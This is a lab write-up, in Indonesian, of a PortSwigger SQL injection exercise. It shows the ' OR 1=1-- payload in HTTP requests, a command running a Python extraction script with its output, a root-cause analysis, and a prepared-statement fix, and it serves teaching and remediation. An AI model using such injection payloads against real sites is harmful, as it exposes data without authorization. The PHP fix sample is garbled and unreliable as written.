# PortSwigger-Writeups-Lab-RetrieveHiddenData
using Python to showing data release after solved SQLI injection.
This is Report


# LAPORAN TEMUAN KEAMANAN: SQL INJECTION (SQLi)


| Informasi Umum | Detail |
| :--- | :--- |
| **Nama Aplikasi** | PortSwigger Web Security Academy Lab |
| **Jenis Kerentanan** | SQL Injection (In-band) |
| **Tingkat Keparahan** | Kritis (High / Critical) |
| **Ditemukan Oleh** | Arif |
| **Tanggal Temuan** | 19 Mei 2026 |

---

## 1. Ringkasan Eksekutif
Ditemukan celah keamanan kritis berjenis **SQL Injection (SQLi)** pada fungsi filter kategori produk. Celah ini memungkinkan penyerang memanipulasi *query* database untuk melewati validasi logika bisnis, sehingga dapat melihat produk-produk tersembunyi yang belum dirilis oleh admin.

## 2. Detail Komponen Terdampak
* **Endpoint:** `/filter`
* **Parameter:** `category`
* **Metode HTTP:** `GET`
* **Vektor Serangan:** Manipulasi parameter URL via Query String

## 3. Langkah Rekonstruksi (Proof of Concept)
1. Akses fitur filter kategori pada aplikasi dengan skenario normal.
   ```http
   GET /filter?category=Gifts HTTP/1.1
   Host: [LAB-ID].web-security-academy.net
   ```
2. Modifikasi parameter `category` dengan menyisipkan karakter petik tunggal (`'`) untuk merusak sintaksis, diikuti oleh logika `OR 1=1` dan karakter komentar `--`.
3. Kirimkan *payload* yang sudah di-*encode* ke server:
   ```http
   GET /filter?category=%27+OR+1=1-- HTTP/1.1
   Host: [LAB-ID].web-security-academy.net
   ```
4. **Hasil:** Aplikasi merespons dengan kode `200 OK` dan menampilkan seluruh isi produk di database, termasuk produk yang berstatus *unreleased*.
### Otomatisasi Menggunakan Skrip Python
Untuk memverifikasi kerentanan secara efisien, sebuah skrip Python dikembangkan untuk mengekstrak seluruh judul produk yang terekspos secara otomatis:

```bash
\$ python3 ExtractText.py https://0a29009a03dd45c8806d49be00e2001a.web-security-academy.net "%27+OR+1=1--"
[+] Produk yang ditemukan di halaman:
  - Dancing In The Dark
  - Your Virtual Journey Starts Here
  - Eggtastic, Fun, Food Eggcessories
  - Fur Babies
  - All-in-One Typewriter
  - The Trolley-ON
  - BBQ Suitcase
  - The Trapster
  - Inflatable Holiday Home
  - Balance Beams
  - Giant Grasshopper
  - The Lazy Dog
  - More Than Just Birdsong
  - Lightbulb Moments
  - Grow Your Own Spy Kit
  - 3D Voice Assistants
  - Portable Hat
  - Hologram Stand In
  - Single Use Food Hider
  - Sprout More Brain Power
```

**Kesimpulan PoC:** Skrip berhasil menarik total 20 produk, membuktikan bahwa pembatasan status rilis produk (*unreleased products*) berhasil ditembus sepenuhnya.

## 4. Analisis Akar Masalah
Aplikasi menggabungkan input pengguna dari parameter `category` secara langsung ke dalam *query* SQL (*string concatenation*) tanpa proses sanitasi.

* **Query Asli di Server:**
  ```sql
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  ```
* **Query Setelah Dimanipulasi Penyerang:**
  ```sql
  SELECT * FROM products WHERE category = '' OR 1=1-- AND released = 1
  ```
  Kondisi `OR 1=1` selalu bernilai benar (*true*). Tanda komentar `--` mematikan sisa perintah pengecekan status rilis (`AND released = 1`), sehingga seluruh data terekspos.

## 5. Dampak Keamanan
* **Pelanggaran Kerahasiaan Data (Confidentiality):** Penyerang dapat melihat data sensitif atau data rahasia yang belum siap dipublikasikan.
* **Ekskalasi Serangan:** Celah ini dapat dikembangkan lebih lanjut untuk membaca data dari tabel lain (menggunakan `UNION`) atau memetakan struktur database.

## 6. Rekomendasi Perbaikan
### Penggunaan Parameterized Queries (Prepared Statements)

### 1. Penggunaan Parameterized Queries (Prepared Statements) Sangat disarankan untuk menerapkan *Prepared Statements* pada aplikasi. Teknik ini bekerja dengan cara memisahkan antara struktur perintah SQL dengan data yang dimasukkan oleh pengguna. Dengan cara ini, database akan memperlakukan input penyerang (seperti `' OR 1=1--`) murni sebagai teks biasa (data), bukan sebagai perintah SQL yang harus dieksekusi.  
### 2. Validasi Input (Whitelisting) Aplikasi harus melakukan pengecekan ketat terhadap parameter `category`. Pastikan sistem hanya menerima nilai yang sudah terdaftar resmi di dalam database (misalnya: `Gifts`, `Tech`, `Clothes`). Jika input yang masuk tidak sesuai dengan daftar tersebut, aplikasi harus otomatis menolak permintaan (*request*).

**Contoh Perbaikan Kode (PHP PDO):**
```php
// Menggunakan placeholder :category untuk mengisolasi input
\(stmt =\)pdo->prepare('SELECT * FROM products WHERE category = :category AND released = 1');
\(stmt->execute(['category' =>\)_GET['category']]);
\(products =\)stmt->fetchAll();
```

### Validasi Input (Whitelisting)
Pastikan nilai parameter `category` yang masuk hanya berupa teks Alfabet yang sesuai dengan daftar kategori yang sah di dalam sistem.
